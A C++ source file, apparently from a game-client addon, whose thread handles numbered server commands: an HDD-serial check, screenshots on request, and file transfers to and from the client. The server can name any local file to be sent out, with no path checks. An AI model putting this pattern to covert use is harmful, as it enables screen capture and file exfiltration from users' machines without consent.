#pragma once



#include "process.h"





addonProcess *gProcess;


extern addonThread *gThread;
extern addonTransfer *gTransfer;
extern addonMutex *gMutex;
extern addonSocket *gSocket;
extern addonScreen *gScreen;
extern addonFS *gFS;

extern std::queue<std::string> rec_from;





addonProcess::addonProcess()
{
	addonDebug("Process constructor called");

	this->processHandle = gThread->Start(addonProcess::Thread, (void *)GetTickCount());
}



addonProcess::~addonProcess()
{
	addonDebug("Process deconstructor called");

	gThread->Stop(this->processHandle);
}



DWORD addonProcess::Thread(void *lpParam)
{
	addonDebug("Thread addonProcess::Thread(%i) successfuly started", (int)lpParam);

	int call_index;
	std::string data;

	do
	{
		if(gSocket->Transfer.is)
		{
			Sleep(100);

			continue;
		}

		if(!rec_from.empty())
		{
			for(unsigned int i = 0; i < rec_from.size(); i++)
			{
				gMutex->Lock();
				data = rec_from.front();
				rec_from.pop();
				gMutex->unLock();

				sscanf_s(data.c_str(), "%*s %*s %d", &call_index);

				switch(call_index)
				{
					case 1000: // TCPQUERY SERVER_CALL 1000 %i1   ---   Response from initial query | %i1 - your HDD serial
					{
						int rec_serial;

						sscanf_s(data.c_str(), "%*s %*s %*d %d", &rec_serial);

						DWORD serial;
						DWORD flags;

						GetVolumeInformationW(L"C:\\", NULL, NULL, &serial, NULL, &flags, NULL, NULL);

						serial += flags;

						if(rec_serial != serial)
						{
							addonDebug("Invalid server answer, terminating");

							gSocket->Close();
						}

						break;
					}

					case 1001: // TCPQUERY SERVER_CALL 1001 %i1   ---   Calls when error occured while connecting to TCP server | %i1 - error code
					{
						int error_code;

						sscanf_s(data.c_str(), "%*s %*s %*d %d", &error_code);

						if(!error_code)
						{
							addonDebug("TCP server is full");
						}

						break;
					}

					//case 1002:

					case 1003: // TCPQUERY SERVER_CALL 1003 %s1   ---   Screenshot take request from server | %s1 - local file name
					{
						char file_name[256];

						sscanf_s(data.c_str(), "%*s %*s %*d %s", file_name, sizeof file_name);

						if(!strlen(file_name))
						{
							addonDebug("NULL screenshot name");
						}

						gScreen->Get(std::string(file_name));
						gSocket->Send(formatString() << "TCPQUERY" << " " << "CLIENT_CALL" << " " << 1003 << " " << file_name);

						break;
					}

					case 2000: // TCPQUERY SERVER_CALL 2000 %s1 %i1   ---   Remote file transfer | %s1 - File name, %i1 - file length
					{
						int length;
						char file_name[256];

						sscanf_s(data.c_str(), "%*s %*s %*d %s %d", file_name, sizeof file_name, &length);

						if((!strcmp(file_name, "END") || !strcmp(file_name, "READY")) && !length)
						{
							addonDebug("Unexpected data passed!");

							break;
						}

						gMutex->Lock();
						gSocket->Transfer.file.assign(file_name);
						gSocket->Transfer.file_length = length;
						gSocket->Transfer.send = false;
						gSocket->Transfer.is = true;
						gMutex->unLock();

						gThread->Start(addonTransfer::ReceiveThread, (void *)gSocket->GetInstance());

						break;
					}

					case 2001: // TCPQUERY SERVER_CALL 2001 %s1   ---   Local file transfer | %s1 - File name
					{
						char file_name[256];

						sscanf_s(data.c_str(), "%*s %*s %*d %s", file_name, sizeof file_name);

						if(!strcmp(file_name, "END") || !strcmp(file_name, "READY"))
						{
							addonDebug("Unexpected data passed!");

							break;
						}

						gMutex->Lock();
						gSocket->Transfer.file.assign(file_name);
						gSocket->Transfer.send = true;
						gSocket->Transfer.is = true;
						gMutex->unLock();

						gThread->Start(addonTransfer::SendThread, (void *)gSocket->GetInstance());

						break;
					}
				}
			}
		}

		Sleep(10);
	}
	while(true);

	return true;
}
